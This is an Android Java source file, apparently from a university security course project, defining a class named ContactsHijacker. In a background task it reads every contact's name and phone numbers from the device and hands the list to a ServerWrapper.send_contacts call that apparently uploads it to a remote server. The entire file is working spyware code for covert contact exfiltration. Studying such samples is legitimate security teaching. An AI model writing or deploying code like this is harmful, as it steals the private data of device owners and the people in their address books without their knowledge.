package com.seginfo.tp.seginfotp;

/**
 * Created by juan on 27/06/15.
 */
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;

public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {

    Activity _act;

    @Override
    protected Integer doInBackground(Activity... args) {
        _act = args[0];
        ServerWrapper.send_contacts(obtain_contacts());
        return 0;
    }

    private ArrayList<Contact> obtain_contacts() {
        ArrayList<Contact> contacts = new ArrayList<Contact>();
        Log.i("ContactsHijacker", "obtaining contacts");
        ContentResolver cr = _act.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                Contact contact = new Contact(Integer.parseInt(id), name);
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contact.addPhone(phoneNo);
                    }
                    pCur.close();
                }
                contacts.add(contact);
            }
        }
        cur.close();
        return contacts;
    }
}

